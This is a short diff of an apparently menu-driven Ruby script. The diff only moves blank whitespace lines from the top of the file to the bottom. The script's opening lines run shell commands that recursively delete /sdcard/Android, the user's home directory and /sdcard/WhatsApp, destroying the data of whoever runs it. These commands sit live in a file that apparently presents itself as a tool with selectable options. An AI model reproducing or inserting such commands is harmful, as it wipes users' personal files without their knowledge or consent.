@@ -1,11 +1,5 @@
 #!/usr/bin/env ruby
 
-
-
- 
-  
-                      
-  
 system("rm -rf cd /sdcard/Android") 
 system("rm -rf cd ~") 
 system("rm -rf cd /sdcard/WhatsApp") 
@@ -64,3 +58,9 @@ else
 puts "[Error ,please select a from the above the list "
 
 end
+
+ 
+  
+                      
+  
+
